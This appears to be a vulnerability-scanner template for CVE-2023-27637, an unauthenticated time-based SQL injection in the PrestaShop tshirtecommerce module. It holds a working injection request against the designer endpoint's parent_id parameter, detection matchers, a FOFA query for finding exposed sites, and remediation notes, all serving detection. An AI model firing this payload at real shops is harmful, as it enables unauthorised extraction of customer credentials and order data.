http:
- matchers:
  - condition: and
    dsl:
    - duration>=8
    - status_code == 200
    - contains(tolower(body), 'product not found')
    type: dsl
  raw:
  - '@timeout: 30s

    GET /module/tshirtecommerce/designer?product_id=900982561&parent_id=1;SELECT%20SLEEP(8);
    HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2023-27637
info:
  author: ritikchaddha
  classification:
    cpe: cpe:2.3:a:tshirtecommerce:custom_product_designer:2.1.4:*:*:*:*:prestashop:*:*
    cve-id: CVE-2023-27637
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-89
    epss-percentile: 0.98119
    epss-score: 0.58686
  description: 'The tshirtecommerce module for PrestaShop is vulnerable to unauthenticated
    SQL injection via the designer endpoint, allowing attackers to execute arbitrary
    SQL queries and extract sensitive information from the database.

    '
  impact: 'Unauthenticated attackers can execute time-based SQL injection through
    the parent_id parameter in the designer endpoint to extract the complete PrestaShop
    database including user credentials and order data.

    '
  metadata:
    fofa-query: body="Prestashop" && body="tshirtecommerce"
    framework: prestashop
    max-request: 1
    product: custom_product_designer
    vendor: tshirtecommerce
  name: PrestaShop `tshirtecommerce` Module - SQL Injection
  reference:
  - https://security.friendsofpresta.org/module/2023/03/21/tshirtecommerce_cwe-89.html
  - https://nvd.nist.gov/vuln/detail/CVE-2023-27637
  - https://codecanyon.net/item/prestashop-custom-product-designer/19202018
  - https://tshirtecommerce.com/
  remediation: 'Update the tshirtecommerce module to the latest version and apply
    all security patches.

    '
  severity: critical
  tags: cve,cve2023,prestashop,tshirtecommerce,sqli,time-based-sqli,vkev,vuln
